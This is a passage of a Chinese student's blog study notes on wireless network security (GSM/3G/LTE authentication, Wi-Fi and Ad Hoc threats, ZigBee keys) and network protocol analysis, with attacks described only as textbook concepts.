title=\"四、为什么可以获得其他用户短信信息？\"></a>四、为什么可以获得其他用户短信信息？</h2><p>因为在无线信道中可以监听到其他设备发出的通信信号，经过解码等操作后就能获得其他用户短信消息。</p>\n<h1 id=\"实验9\"><a href=\"#实验9\" class=\"headerlink\" title=\"实验9\"></a>实验9</h1><h2 id=\"一、GPS定位原理\"><a href=\"#一、GPS定位原理\" class=\"headerlink\" title=\"一、GPS定位原理\"></a>一、GPS定位原理</h2><p>设GPS系统中卫星为Pi，P1、P2和P3的位置的位置信息可以通过星历数据计算得到，只要知道了信号的卫星发射时刻和 GPS 接收机收到信号的时刻，就可以计算出卫星到用户的距离，然而当地时间和卫星时间并不是同步的，会出现一个时间偏移量∆t，因此，这个时间偏移量∆t也应考虑进去，即公式为</p>\n<p>$$<br>\\sqrt{(x-x_i)^2+(x-y_i)^2+(x-z_i)^2}=C(\\Delta t_i+t_i)<br>$$</p>\n<h2 id=\"二、北斗与GPS原理的异同\"><a href=\"#二、北斗与GPS原理的异同\" class=\"headerlink\" title=\"二、北斗与GPS原理的异同\"></a>二、北斗与GPS原理的异同</h2><ul>\n<li><p>相同点：均可实现全球定位</p>\n</li>\n<li><p>区别:</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">北斗</th>\n<th align=\"center\">GPS</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">三频信号</td>\n<td align=\"center\">双频信号</td>\n</tr>\n<tr>\n<td align=\"center\">有源定位+无源定位</td>\n<td align=\"center\">无源定位</td>\n</tr>\n<tr>\n<td align=\"center\">有短报文通信服务</td>\n<td align=\"center\">无通信服务</td>\n</tr>\n<tr>\n<td align=\"center\">可获得其他人的位置信息</td>\n<td align=\"center\">只能获得自身位置信息</td>\n</tr>\n<tr>\n<td align=\"center\">境内监控</td>\n<td align=\"center\">非美国本土也有 地面监控 部分</td>\n</tr>\n</tbody></table>\n</li>\n</ul>\n<h2 id=\"三、给出一个特定地点的经纬度信息，在百度地图中呈现并截图\"><a href=\"#三、给出一个特定地点的经纬度信息，在百度地图中呈现并截图\" class=\"headerlink\" title=\"三、给出一个特定地点的经纬度信息，在百度地图中呈现并截图\"></a>三、给出一个特定地点的经纬度信息，在百度地图中呈现并截图</h2><p><img src=\"9-1.png\" alt></p>\n<h2 id=\"四、定位到该特定地点并截图\"><a href=\"#四、定位到该特定地点并截图\" class=\"headerlink\" title=\"四、定位到该特定地点并截图\"></a>四、定位到该特定地点并截图</h2><p><img src=\"9-2-1.png\" alt></p>\n<p><img src=\"9-2-2.png\" alt></p>\n","categories":["技术"],"tags":["无线网络安全"]},{"title":"无线网络安全复习整理","url":"https://littleghost2016.github.io/2018/07/16/无线网络安全复习整理/","content":"<h1 id=\"第一章\"><a href=\"#第一章\" class=\"headerlink\" title=\"第一章\"></a>第一章</h1><h2 id=\"7种主要安全威胁\"><a href=\"#7种主要安全威胁\" class=\"headerlink\" title=\"7种主要安全威胁\"></a>7种主要安全威胁</h2><p>窃听、篡改、伪装、重放、非授权访问、拒绝服务、否认。</p>\n<h2 id=\"3种无线通信攻击方式\"><a href=\"#3种无线通信攻击方式\" class=\"headerlink\" title=\"3种无线通信攻击方式\"></a>3种无线通信攻击方式</h2><p>无线窃听/假冒/篡改、信号重放、信号劫持。</p>\n<h2 id=\"不同协议层次安全防护措施\"><a href=\"#不同协议层次安全防护措施\" class=\"headerlink\" title=\"不同协议层次安全防护措施\"></a>不同协议层次安全防护措施</h2><table>\n<thead>\n<tr>\n<th align=\"center\">层次</th>\n<th align=\"center\">功能</th>\n<th align=\"center\">手段</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">应用层</td>\n<td align=\"center\">+访问控制</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">传输层</td>\n<td align=\"center\">+身份认证</td>\n<td align=\"center\">端到端加密</td>\n</tr>\n<tr>\n<td align=\"center\">网络层</td>\n<td align=\"center\">…</td>\n<td align=\"center\">端到端加密</td>\n</tr>\n<tr>\n<td align=\"center\">链路层</td>\n<td align=\"center\">+完整性、抗重放</td>\n<td align=\"center\">链路加密</td>\n</tr>\n<tr>\n<td align=\"center\">物理层</td>\n<td align=\"center\">机密性、抗干扰</td>\n<td align=\"center\">信道加密、跳频扩频</td>\n</tr>\n</tbody></table>\n<h2 id=\"不同网络安全防护措施\"><a href=\"#不同网络安全防护措施\" class=\"headerlink\" title=\"不同网络安全防护措施\"></a>不同网络安全防护措施</h2><table>\n<thead>\n<tr>\n<th align=\"center\">网络</th>\n<th align=\"center\">需求</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">蜂窝网</td>\n<td align=\"center\">+网络域安全</td>\n</tr>\n<tr>\n<td align=\"center\">无线局域网</td>\n<td align=\"center\">网络接入安全、用户域安全、应用域安全</td>\n</tr>\n<tr>\n<td align=\"center\">无线个域网</td>\n<td align=\"center\">无线传输安全</td>\n</tr>\n<tr>\n<td align=\"center\">无线自组网</td>\n<td align=\"center\">群组通信安全、动态组网安全</td>\n</tr>\n<tr>\n<td align=\"center\">异构无线网</td>\n<td align=\"center\">跨域接入安全、安全互联互通</td>\n</tr>\n</tbody></table>\n<h1 id=\"第二章\"><a href=\"#第二章\" class=\"headerlink\" title=\"第二章\"></a>第二章</h1><h2 id=\"2G\"><a href=\"#2G\" class=\"headerlink\" title=\"2G\"></a>2G</h2><p><em>2G：支持话音和低速数据。</em></p>\n<p><em>2.5G：GPRS、WPA、蓝牙。</em></p>\n<p>IMSI — International Mobile Subscriber Identification，TMSI。AUC为每个用户提供三元组：随机数RAND、认证响应SRES、密钥Kc。<u>VLR处存储TMSI和IMSI之间的对应关系</u>，<em>有在用户开机或者VLR数据丢失的时候IMSI才被发送，平时仅在无线信道上发送移动用户相应的TMSI</em>。</p>\n<ul>\n<li>有线—线缆——明码传输</li>\n<li>无线—电磁波—加密传输</li>\n<li>有IMSI（可读出），K（过程中不传输，无法读出，网络侧也有相同数据）和ICCID这3组数据就可以复制SIM卡。</li>\n<li>鉴权算法A3，编码算法A5，数据加密密钥生成算法A8</li>\n<li>A3、A8、A5、K、Kc是不在网络中传递的，从而增强了网络的安全性。</li>\n</ul>\n<h3 id=\"GSM鉴权过程\"><a href=\"#GSM鉴权过程\" class=\"headerlink\" title=\"GSM鉴权过程\"></a>GSM鉴权过程</h3><blockquote>\n<p>MSC/VLR：移动交换中心</p>\n</blockquote>\n<p>AUC-128bit随机数-&gt;手机</p>\n<p>SIM卡-Ki+随机数-A3算法-生成SRES-&gt;AUC</p>\n<p>AUC比对自己的和发来的SRES</p>\n<h3 id=\"GSM存在的安全问题\"><a href=\"#GSM存在的安全问题\" class=\"headerlink\" title=\"GSM存在的安全问题\"></a>GSM存在的安全问题</h3><ul>\n<li>单项认证</li>\n<li>非端到端加密</li>\n<li>移动台第一次注册和漫游时，IMSI可能以明文方式发送到VLR/MSC</li>\n<li>加密密钥长度未64bit，太短</li>\n<li>未考虑数据完整性</li>\n<li>加密算法不公开，无法得到客观评价</li>\n<li>加密算法固定不变，缺乏算法和密钥协商部分</li>\n</ul>\n<h2 id=\"3G\"><a href=\"#3G\" class=\"headerlink\" title=\"3G\"></a>3G</h2><h3 id=\"Network-access-security-网络接入安全\"><a href=\"#Network-access-security-网络接入安全\" class=\"headerlink\" title=\"Network access security-网络接入安全\"></a>Network access security-网络接入安全</h3><p>用户身份/位置/行踪保密，密钥分发，实体认证，数据完整性用户数据与信令数据的保密</p>\n<h3 id=\"Provider-domain-security-网络域安全\"><a href=\"#Provider-domain-security-网络域安全\" class=\"headerlink\" title=\"Provider domain security-网络域安全\"></a>Provider domain security-网络域安全</h3><p>核心网络实体间安全交换数据：数据加密，数据认证，身份认证</p>\n<h3 id=\"User-domain-security\"><a href=\"#User-domain-security\" class=\"headerlink\" title=\"User domain security\"></a>User domain security</h3><p>用户与智能卡之间的认证，智能卡与终端之间的认证，链路保护</p>\n<h3 id=\"Application-security\"><a href=\"#Application-security\" class=\"headerlink\" title=\"Application security\"></a>Application security</h3><p>用户能知道一个安全特征集合是否在运行，并且用户可以根据自己的安全需求进行设置</p>\n<blockquote>\n<p>HLR（home location register）保存的是用户的基本信息，如你的SIM的卡号、手机号码、签约信息等，和动态信息，如当前的位置、是否已经关机等；<br>VLR(visiting location register)保存的是用户的动态信息和状态信息，以及从HLR下载的用户的签约信息。 </p>\n<p>当你从北京到上海之后，手机会自动向上海的VLR发起位置更新（登记），上海的VLR会将你现在的位置报告到北京的HLR。当他人呼你时，交换机首先向HLR查询你现在所在的位置，然后接可以呼到你了。</p>\n</blockquote>\n<h3 id=\"一个协议，五元组的生成\"><a href=\"#一个协议，五元组的生成\" class=\"headerlink\" title=\"一个协议，五元组的生成\"></a>一个协议，五元组的生成</h3><h3 id=\"GSM和3G的安全对比\"><a href=\"#GSM和3G的安全对比\" class=\"headerlink\" title=\"GSM和3G的安全对比\"></a>GSM和3G的安全对比</h3><p><img src=\"201807150043-GSM%E5%92%8C3G%E6%AF%94%E8%BE%83.png\" alt></p>\n<h3 id=\"鉴权过程\"><a href=\"#鉴权过程\" class=\"headerlink\" title=\"鉴权过程\"></a>鉴权过程</h3><table>\n<thead>\n<tr>\n<th align=\"center\">MS</th>\n<th align=\"center\">VLR/SGSN</th>\n<th align=\"center\">HE/HLR</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\"></td>\n<td align=\"center\"></td>\n<td align=\"center\">认证请求</td>\n</tr>\n<tr>\n<td align=\"center\"></td>\n<td align=\"center\">生成认证向量AV(1..n)</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\"></td>\n<td align=\"center\">[存储认证向量组]+[选择一个]</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">RAND || AUTH</td>\n<td align=\"center\"></td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">[验证AUTH || 计算RES]</td>\n<td align=\"center\"></td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\"></td>\n<td align=\"center\">RES</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\"></td>\n<td align=\"center\">[比较RES和XRES]</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">计算IC和CK</td>\n<td align=\"center\">选择IK和CK</td>\n<td align=\"center\"></td>\n</tr>\n</tbody></table>\n<h2 id=\"4G\"><a href=\"#4G\" class=\"headerlink\" title=\"4G\"></a>4G</h2><h3 id=\"LTE安全威胁\"><a href=\"#LTE安全威胁\" class=\"headerlink\" title=\"LTE安全威胁\"></a>LTE安全威胁</h3><p>3G网络面临的安全威胁同样存在；对eNB（尤其是home eNB）的物理攻击是可能的，对eNB的网络攻击是可能的</p>\n<h3 id=\"LTE-SAE的安全包括两个层次\"><a href=\"#LTE-SAE的安全包括两个层次\" class=\"headerlink\" title=\"LTE/SAE的安全包括两个层次\"></a>LTE/SAE的安全包括两个层次</h3><ul>\n<li>接入层（ AS）安全： UE与 eNB之间的安全</li>\n<li>非接入层（ NAS）安全： UE与 MME之间的安全</li>\n</ul>\n<h3 id=\"只是认证向量中-CK，-IK变为Kasme\"><a href=\"#只是认证向量中-CK，-IK变为Kasme\" class=\"headerlink\" title=\"只是认证向量中 CK， IK变为Kasme\"></a>只是认证向量中 CK， IK变为Kasme</h3><h3 id=\"LTE中的安全问题\"><a href=\"#LTE中的安全问题\" class=\"headerlink\" title=\"LTE中的安全问题\"></a>LTE中的安全问题</h3><ul>\n<li>截获IMSI-<em>在UTRAN中UE无法拒绝网络要求明文IMSI</em></li>\n<li>跟踪UE-3种：<em>跟踪用户的临时标识；利用IMSI/TMSI和RNTI之间的联系；利用IP地址和TMSI/IMSI/RNTI</em></li>\n<li>强制切换eNB/强制切换到传统网络</li>\n</ul>\n<h1 id=\"第三章\"><a href=\"#第三章\" class=\"headerlink\" title=\"第三章\"></a>第三章</h1><h2 id=\"STA与AP的连接建立过程\"><a href=\"#STA与AP的连接建立过程\" class=\"headerlink\" title=\"STA与AP的连接建立过程\"></a>STA与AP的连接建立过程</h2><table>\n<thead>\n<tr>\n<th align=\"center\">有线网络——接入点（AP）</th>\n<th align=\"center\"></th>\n<th align=\"center\">无线终端（STA）</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">固定间隔（通常10秒）广播信标</td>\n<td align=\"center\">&lt;-探测请求-</td>\n<td align=\"center\">扫描所有频段</td>\n</tr>\n<tr>\n<td align=\"center\"></td>\n<td align=\"center\">-探测响应-&gt;</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\"></td>\n<td align=\"center\">&lt;-认证请求-</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">假定不使用安全措施，马上回复</td>\n<td align=\"center\">-认证响应-&gt;</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\"></td>\n<td align=\"center\">&lt;-关联请求-</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\"></td>\n<td align=\"center\">-关联响应-&gt;</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\"></td>\n<td align=\"center\">&lt;-数据传输-</td>\n<td align=\"center\"></td>\n</tr>\n</tbody></table>\n<p><img src=\"201807151122-STA%E4%B8%8EAP%E7%9A%84%E8%BF%9E%E6%8E%A5%E5%BB%BA%E7%AB%8B%E8%BF%87%E7%A8%8B.png\" alt></p>\n<h2 id=\"BSS和ESS\"><a href=\"#BSS和ESS\" class=\"headerlink\" title=\"BSS和ESS\"></a>BSS和ESS</h2><p><img src=\"201807151723-BSS%E5%92%8CESS.png\" alt></p>\n<h2 id=\"安全威胁\"><a href=\"#安全威胁\" class=\"headerlink\" title=\"安全威胁\"></a>安全威胁</h2><p>物理威胁：</p>\n<ul>\n<li>电缆</li>\n<li>天线</li>\n<li>无线网卡等</li>\n</ul>\n<p>干扰：</p>\n<ul>\n<li>微波</li>\n<li>人为干扰等</li>\n</ul>\n<p>偷窃用户设备：</p>\n<ul>\n<li>窃听、截取和监听</li>\n<li>欺骗和非授权访问（伪装成授权用户）——对策：使用外部双因子身份验证，如RADIUS或SecurID</li>\n<li>网络接管与篡改</li>\n<li>伪造AP</li>\n<li>破解密码</li>\n<li>拒绝服务攻击</li>\n<li>无线网络钓鱼攻击</li>\n<li>恶意软件和病毒</li>\n</ul>\n<h2 id=\"SSID两种机制\"><a href=\"#SSID两种机制\" class=\"headerlink\" title=\"SSID两种机制\"></a>SSID两种机制</h2><ul>\n<li>对于广播型SSID ，直接使用无线探测工具进行获取</li>\n<li>对于非广播型SSID，伪造AP发送断开连结帧，使客户端重新连结时进行捕获</li>\n</ul>\n<h2 id=\"DDOS\"><a href=\"#DDOS\" class=\"headerlink\" title=\"DDOS\"></a>DDOS</h2><table>\n<thead>\n<tr>\n<th align=\"center\"></th>\n<th align=\"center\"></th>\n<th align=\"center\">未认证，未关联</th>\n<th align=\"center\"></th>\n<th align=\"center\"></th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">认证洪水攻击</td>\n<td align=\"center\">认证成功</td>\n<td align=\"center\"></td>\n<td align=\"center\">取消认证</td>\n<td align=\"center\">取消认证洪水攻击</td>\n</tr>\n<tr>\n<td align=\"center\">（发送认证请求*）</td>\n<td align=\"center\"></td>\n<td align=\"center\"></td>\n<td align=\"center\"></td>\n<td align=\"center\">（伪造AP发送取消认证报文^）</td>\n</tr>\n<tr>\n<td align=\"center\"></td>\n<td align=\"center\"></td>\n<td align=\"center\">已认证，未关联</td>\n<td align=\"center\"></td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">关联洪水攻击</td>\n<td align=\"center\">关联成功</td>\n<td align=\"center\"></td>\n<td align=\"center\">取消关联</td>\n<td align=\"center\">取消关联洪水攻击</td>\n</tr>\n<tr>\n<td align=\"center\">（发送关联请求*）</td>\n<td align=\"center\"></td>\n<td align=\"center\"></td>\n<td align=\"center\"></td>\n<td align=\"center\">（伪造AP发送取消关联报文^）</td>\n</tr>\n<tr>\n<td align=\"center\"></td>\n<td align=\"center\"></td>\n<td align=\"center\">已认证，已关联</td>\n<td align=\"center\"></td>\n<td align=\"center\"></td>\n</tr>\n</tbody></table>\n<blockquote>\n<p>*=使合法用户得不到响应 </p>\n<p>^=使合法用户不能完成认证/关联</p>\n</blockquote>\n<h2 id=\"802-11i-（WPA-WPA2区别）认证\"><a href=\"#802-11i-（WPA-WPA2区别）认证\" class=\"headerlink\" title=\"802.11i （WPA/WPA2区别）认证\"></a>802.11i （WPA/WPA2区别）认证</h2><ul>\n<li><p>WPA = IEEE 802.11i draft 3 = IEEE 802.1X/EAP + WEP(选择性项目)/TKIP</p>\n</li>\n<li><p>WPA2 = WPA+/CCMP</p>\n</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th align=\"center\">WPA</th>\n<th align=\"center\">WPA2</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">PSK模式下主密钥手工输入</td>\n<td align=\"center\">PSK模式下主密钥由手工输入和SSID组成（PMK)</td>\n</tr>\n<tr>\n<td align=\"center\">使用TKIP算法——基于RC4</td>\n<td align=\"center\">使用AES算法——完全脱离RC4算法</td>\n</tr>\n<tr>\n<td align=\"center\">密钥分为主与临时密钥</td>\n<td align=\"center\">主PMK、临时PTK、GTK（解密广播与多播消息）</td>\n</tr>\n<tr>\n<td align=\"center\">AP间切换会导致语音中断</td>\n<td align=\"center\">采用预授权方式来保证无缝切换</td>\n</tr>\n</tbody></table>\n<ul>\n<li><p>无线局域网安全协议：开放系统认证 + 共享密钥认证（可选）</p>\n</li>\n<li><p><img src=\"201807151819-WPA%E5%92%8CWPA2.png\" alt></p>\n</li>\n</ul>\n<h2 id=\"RSN工作流程\"><a href=\"#RSN工作流程\" class=\"headerlink\" title=\"RSN工作流程\"></a>RSN工作流程</h2><ul>\n<li><p>RSN安全机制只工作在数据链路层，并不提供端到端的应用层通信保护。</p>\n</li>\n<li><p>三种类型的设备：STA、AP、AS(Authentication Servers)</p>\n</li>\n<li><table>\n<thead>\n<tr>\n<th align=\"center\">STA</th>\n<th align=\"center\">AP</th>\n<th align=\"center\">服务器</th>\n<th align=\"center\">STA</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\"></td>\n<td align=\"center\">发现（加密与认证机制满足AP要求）</td>\n<td align=\"center\"></td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\"></td>\n<td align=\"center\">[转发]</td>\n<td align=\"center\">认证</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\"></td>\n<td align=\"center\">密钥管理</td>\n<td align=\"center\">密钥分配</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\"></td>\n<td align=\"center\">（RSN只保护STA与AP数据链路层间的安全）</td>\n<td align=\"center\"></td>\n<td align=\"center\">加密的数据传输</td>\n</tr>\n<tr>\n<td align=\"center\"></td>\n<td align=\"center\">连接中止</td>\n<td align=\"center\"></td>\n<td align=\"center\"></td>\n</tr>\n</tbody></table>\n<blockquote>\n<p>AP不参与认证</p>\n</blockquote>\n</li>\n</ul>\n<h2 id=\"四次握手\"><a href=\"#四次握手\" class=\"headerlink\" title=\"四次握手\"></a>四次握手</h2><table>\n<thead>\n<tr>\n<th align=\"center\">WirelessStation——AccessPoint</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">AP的IEEE802.1X控制端口关闭</td>\n</tr>\n<tr>\n<td align=\"center\">&lt;-发送Anonce-</td>\n</tr>\n<tr>\n<td align=\"center\">-发送Snonce（带MIC）-&gt;</td>\n</tr>\n<tr>\n<td align=\"center\">&lt;-是否适用一对一密码（带MIC）-</td>\n</tr>\n<tr>\n<td align=\"center\">-响应，四次握手结束-&gt;</td>\n</tr>\n<tr>\n<td align=\"center\">AP的IEEE802.1X控制端口打开</td>\n</tr>\n</tbody></table>\n<h1 id=\"第四章\"><a href=\"#第四章\" class=\"headerlink\" title=\"第四章\"></a>第四章</h1><h2 id=\"Ad-Hoc安全问题\"><a href=\"#Ad-Hoc安全问题\" class=\"headerlink\" title=\"Ad Hoc安全问题\"></a>Ad Hoc安全问题</h2><blockquote>\n<p>无线局域网为单跳网络，不存在路由问题；主要研究集中在物理层和数据链路层；移动终端的所有通信必须经过无线接入点进行<br>Ad Hoc网络为多跳，的研究内容主要以路由协议为核心的网络层设计</p>\n</blockquote>\n<ul>\n<li>无线信道使得Ad Hoc网络可能遭受偷听、伪装、消息重放、消息修改等攻击</li>\n<li>节点可能布置在敌对环境中</li>\n<li>拓扑结构和成员是动态的，节点之间的信任关系也是动态变化的</li>\n<li>安全机制应该适应大规模网络</li>\n</ul>\n<h2 id=\"安全路由-能判断是哪种协议类型的路由攻击\"><a href=\"#安全路由-能判断是哪种协议类型的路由攻击\" class=\"headerlink\" title=\"安全路由-能判断是哪种协议类型的路由攻击\"></a>安全路由-能判断是哪种协议类型的路由攻击</h2><blockquote>\n<p><del>路由表驱动路由协议：</del><br><del>按需路由协议：</del><br><del>混合路由协议：（局部范围1，远距离2）</del></p>\n<p>先应式</p>\n<p>反应式</p>\n<p>混合式</p>\n</blockquote>\n<ul>\n<li>路由协议的攻击模型</li>\n</ul>\n<ul>\n<li><p>更改路由序号的重定向攻击（AODV与DSR）</p>\n</li>\n<li><p>更改跳数的重定向攻击（AODV）</p>\n<ul>\n<li>假冒攻击</li>\n<li>拒绝服务攻击</li>\n</ul>\n</li>\n<li><p>目的节点拒绝服务攻击</p>\n</li>\n<li><p>篡改源路由进行拒绝服务攻击（DSR）</p>\n<ul>\n<li>伪造报文攻击</li>\n</ul>\n</li>\n<li><p>伪造路由错误信息（AODV和DSR）</p>\n</li>\n<li><p>破坏路由状态（DSR）</p>\n</li>\n<li><p>路由表溢出</p>\n</li>\n<li><p>重放攻击</p>\n</li>\n<li><p>黑洞攻击</p>\n<ul>\n<li>自私节点的不合作攻击</li>\n</ul>\n</li>\n<li><p>能量消耗</p>\n</li>\n<li><p>自身数据发送延迟</p>\n</li>\n</ul>\n<h2 id=\"密钥管理-要求和分类\"><a href=\"#密钥管理-要求和分类\" class=\"headerlink\" title=\"密钥管理-要求和分类\"></a>密钥管理-要求和分类</h2><h3 id=\"基本要求\"><a href=\"#基本要求\" class=\"headerlink\" title=\"基本要求\"></a>基本要求</h3><ul>\n<li><p>前向保密：节点退出（主动地或者被强制地）通信组后不能够继续参与组通信<em>即它们无法利用自己拥有的组密钥解密后续组通信数据或者生成有效的加密数据</em></p>\n</li>\n<li><p>后向保密：当新的成员加入到通信组后，必须保证新加入的成员无法解密它加入以前的组通信报文</p>\n</li>\n<li><p>抗合谋攻击</p>\n</li>\n</ul>\n<h3 id=\"分类\"><a href=\"#分类\" class=\"headerlink\" title=\"分类\"></a>分类</h3><ul>\n<li><p>集中式组密钥管理协议（只适用于小规模的组通信）：存在单一的密钥服务器KS对整个组的密钥进行管理。</p>\n</li>\n<li><p>分布式组密钥管理协议：分布式组密钥协议的特点是群组中没有固定的控制节点，组密钥由所有成员贡献的秘密份额协商生成。根据密钥份额的分布性可以分为部分分布式和完全分布式两种情况。</p>\n</li>\n<li><p>层次式组密钥管理协议：具有很强的可扩展性，层次结构也存在随着分层级数的增加</p>\n</li>\n</ul>\n<h2 id=\"传感器-攻击手段和防御方法\"><a href=\"#传感器-攻击手段和防御方法\" class=\"headerlink\" title=\"传感器-攻击手段和防御方法\"></a>传感器-攻击手段和防御方法</h2><ul>\n<li><img src=\"201807152300%E4%BC%A0%E6%84%9F%E5%99%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E5%92%8C%E9%98%B2%E5%BE%A1%E6%96%B9%E6%B3%95.png\" alt></li>\n</ul>\n<h1 id=\"第五章\"><a href=\"#第五章\" class=\"headerlink\" title=\"第五章\"></a>第五章</h1><h2 id=\"zigbee-基本信息：工作频段、传输距离-速率\"><a href=\"#zigbee-基本信息：工作频段、传输距离-速率\" class=\"headerlink\" title=\"zigbee-基本信息：工作频段、传输距离/速率\"></a>zigbee-基本信息：工作频段、传输距离/速率</h2><ul>\n<li>2.4GHz-250kbps-16</li>\n<li>868MHz-20kbps-1</li>\n<li>915MHz-40kbps-16</li>\n</ul>\n<h2 id=\"节点类型、组网形态\"><a href=\"#节点类型、组网形态\" class=\"headerlink\" title=\"节点类型、组网形态\"></a>节点类型、组网形态</h2><ul>\n<li>全功能型节点、精简功能节点</li>\n<li>星型、网状星、簇状型</li>\n</ul>\n<h2 id=\"安全借鉴了802-15-4\"><a href=\"#安全借鉴了802-15-4\" class=\"headerlink\" title=\"安全借鉴了802.15.4\"></a>安全借鉴了802.15.4</h2><h2 id=\"三类安全模式\"><a href=\"#三类安全模式\" class=\"headerlink\" title=\"三类安全模式\"></a>三类安全模式</h2><ul>\n<li>无安全模式：默认，可能被窃听</li>\n<li>访问控制列表模式：通过访问控制列表ACL限制非法节点获取数据</li>\n<li>安全模式，同时使用访问控制和帧载荷密码保护</li>\n</ul>\n<h2 id=\"三种密钥-特性\"><a href=\"#三种密钥-特性\" class=\"headerlink\" title=\"三种密钥+特性\"></a>三种密钥+特性</h2><ul>\n<li><p>主密钥：用于配合ZigBee对称密钥的建立（SKKE）过程来派生其它密钥</p>\n</li>\n<li><p>网络密钥：保护广播和组数据的机密性和完整性，同时也为网络认证提供保护（仅在广播消息中使用）</p>\n</li>\n<li><p>链接密钥：保护两个设备之间单播数据的机密性和完整性</p>\n</li>\n</ul>\n<h2 id=\"密钥生成两种方式：密钥传输、预安装\"><a href=\"#密钥生成两种方式：密钥传输、预安装\" class=\"headerlink\" title=\"密钥生成两种方式：密钥传输、预安装\"></a>密钥生成两种方式：密钥传输、预安装</h2>","categories":["技术"],"tags":["无线网络安全"]},{"title":"网络协议分析复习整理","url":"https://littleghost2016.github.io/2018/06/28/网络协议分析复习整理/","content":"<h1 id=\"一、概论\"><a href=\"#一、概论\" class=\"headerlink\" title=\"一、概论\"></a>一、概论</h1><ol>\n<li><em>协议是网络中互相通信的<strong>对等实体间</strong>进行数据交换而建立的<strong>规则</strong>、标准或约定，保证实体在计算机网络中<strong>有序地交换数据</strong>。实体(Entity)是指任何可以发送或接收信息的硬件或软件进程，在大多数情况下，就是一个特定的软件进程。位于<strong>不同系统</strong>的<strong>同一层次内交互</strong>的实体，就构成了<strong>对等实体</strong>。</em></li>\n<li><strong>协议</strong>是规则，约定，而服务是功能，本领。从层次上来说：协议是通信双方对等层之间才有的，是水平方向上的关系。而<strong>服务</strong>则是通信某一端上下层之间才有的，是垂直方向上的关系，而且是自下向上提供的 。<strong>每一层的协议是通过下层对本层提供的服务来支持实现的，服务是指下层为紧向邻的上层提供的功能调用。</strong></li>\n<li>网络协议就是具有规定文法、语法和语义的语言 。<em>文法给出了有效信息的精确格式 ，语法描述了数据交换的规则，语义规定了可交换信息的词汇及其含义。</em></li>\n<li>协议<strong>三要素</strong>：<strong>语法</strong>、<strong>语义</strong>、<strong>同步</strong>。<strong>六元素</strong>：<strong>服务原语和服务原语时序</strong>、<strong>协议数据单元PDU和PDU交换时序</strong> 、<strong>协议状态</strong>、<strong>协议事件</strong>、<strong>协议变量</strong>、<strong>协议操作和谓词</strong>。</li>\n<li>网络协议中的语法体现为数据报文中的控制信息(通常在报文的首部)和各种控制报文的结构、格式。<em>即规定报文的长度，报文中划分多少个域(Field)，每个域的名称、数据类型、长度等。其中，报文中各个域的类型、长度及相互间的位置、顺序关系则构成了词法。</em></li>\n<li>网络协议的语义可以理解为：协议数据报文中的<u>控制信息和控制报文所约定的含义</u>，即<u>需要完成何种动作，发出何种控制信息以及做出何种响应</u>。<em>例：IP报文首部控制信息中的目的地址域指明了报文的目的地，接收到此报文的网络节点均将该域作为进行路由选择的依据，因而，规定在首部控制信息中的给定域给出目的节点地址就是一种语义。</em></li>\n<li>简单地说，同步是指<u>事件发生顺序</u>的详细说明。具体来说指通信过程中各种<u>控制报文传送的顺序关系</u>。<em>例：例如“允许连接”或“拒绝连接”报文必须是作为请求连接报文的一种响应来发送，“拆除连接”报文也必须在建立连接后的某种条件下发送。</em></li>\n<li>为什么推崇协议标准化：1.产品质量和可靠性 2.提供更好的产品互联性 3.简化使用 4.提高发布效率</li>\n<li>ISO/IETF/W3C/ATM Forum/ANSI/IEEE/ACM</li>\n<li>协议工程过程是<u>协议化</u>、<u>工程化</u>的。</li>\n<li>“协议的设计、形式描述、验证、实现、测试、运行”这一全过程称为“协议开发”，即协议开发是指协议工程活动的全过程。</li>\n<li><em>协议设计阶段的结果是非形式描述协议文本。协议设计涉及到很多技术，如差错控制技术、流量控制技术、连接管理技术、路由选择技术等。协议设计还必须遵循一些基本原则，如结构化、模块化等。</em></li>\n<li>形式描述模型：有限状态机FSM (Finite State Machine) 、Petri网(PetriNet) 。形式描述语言：CCITT制定的SDL。</li>\n<li>协议的验证主要内容包括：<u>可达性分析、死锁和活锁检测、协议的有界性和完整性检验、协议的动作序列检查、通道溢出检查</u>等</li>\n<li>协议一致性测试要做到两点：<u>彻底性(彻底测试所实现的协议)</u>和<u>标准化(使用的测试集必须是标准的)</u>。协议的性能主要包括<u>吞吐量</u>和<u>时延</u>。</li>\n<li><img src=\"%E5%8D%8F%E8%AE%AE%E8%AE%BE%E8%AE%A1%E8%BF%87%E7%A8%8B.png\" alt></li>\n</ol>\n<h1 id=\"二、协议设计\"><a href=\"#二、协议设计\" class=\"headerlink\" title=\"二、协议设计\"></a>二、协议设计</h1><ol>\n<li>同一系统相邻两层的实体进行交互的地方，通常称为<strong>服务访问点SAP</strong> (Service Access 